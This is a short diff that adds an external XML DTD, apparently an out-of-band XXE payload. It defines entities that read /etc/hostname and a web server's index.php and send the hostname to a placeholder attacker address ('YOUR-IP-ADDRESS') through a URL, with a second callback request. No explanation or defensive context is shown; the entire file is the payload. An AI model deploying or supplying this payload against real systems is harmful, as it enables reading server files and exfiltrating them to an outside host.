@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM 'file:///etc/hostname'>
+<!ENTITY % data SYSTEM 'file:///var/www/html/index.php' >
+<!ENTITY test SYSTEM 'http://YOUR-IP-ADDRESS/yolo=%file;' >
+<!ENTITY t SYSTEM 'http://YOUR-IP-ADDRESS/yoloooo' >
